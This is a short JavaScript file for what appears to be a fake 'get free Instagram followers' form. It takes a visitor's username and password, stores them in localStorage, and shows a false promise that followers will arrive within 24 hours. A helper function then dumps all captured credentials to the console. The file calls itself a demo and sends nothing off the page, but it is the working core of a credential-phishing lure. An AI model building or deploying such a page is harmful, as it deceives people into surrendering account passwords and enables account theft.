function sanitize(str){
    return String(str).replace(/[<>]/g,'');
}

document.getElementById('demoForm').addEventListener('submit', function(e){
    e.preventDefault();

    const user = sanitize(document.getElementById('username').value.trim());
    const pass = sanitize(document.getElementById('password').value);
    const foll = Number(document.getElementById('followers').value);

    const record = {
        username: user,
        password: pass,
        followers_requested: foll,
        timestamp: new Date().toISOString()
    };

    const storeKey = 'ig_demo_records_v1';
    const existing = JSON.parse(localStorage.getItem(storeKey) || '[]');
    existing.push(record);
    localStorage.setItem(storeKey, JSON.stringify(existing));

    document.getElementById('messageArea').innerHTML =
      '<div class="success">After 24 hours these Followers will be updated in your Instagram account.</div>';

    document.getElementById('password').value = '';
});

// View saved data in console
window.viewDemoRecords = function(){
    const existing = JSON.parse(localStorage.getItem('ig_demo_records_v1') || '[]');
    console.table(existing);
    return existing;
}
